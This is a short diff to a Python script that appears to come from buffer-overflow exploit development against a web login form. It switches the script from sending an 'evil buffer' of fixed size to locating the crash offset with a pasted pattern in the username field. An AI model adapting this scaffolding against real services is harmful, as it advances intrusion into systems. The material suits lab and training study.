@@ -1,15 +1,13 @@
 #!/usr/bin/python
 import socket
 
-# Change size on line 11 to bytes fuzzer crashed on.
-# Replace Buffer Post request details with Wireshark or BurpSuite Post Request details
-# Changes IP Address on lines 18,22,32
+# Paste Pattern Created into line 11
+# Replace Buffer Post request details with Wireshark or BurpSuite Post Request details lines 15-23
+# Changes IP Address on lines 16,20,30
 
 try:
-  print "\nSending evil buffer..."
- 
-   size = 800
-  
+  print "\nLocating Offset..."
+
   inputBuffer = ""
   
   content = "username=" + inputBuffer + "&password=A"
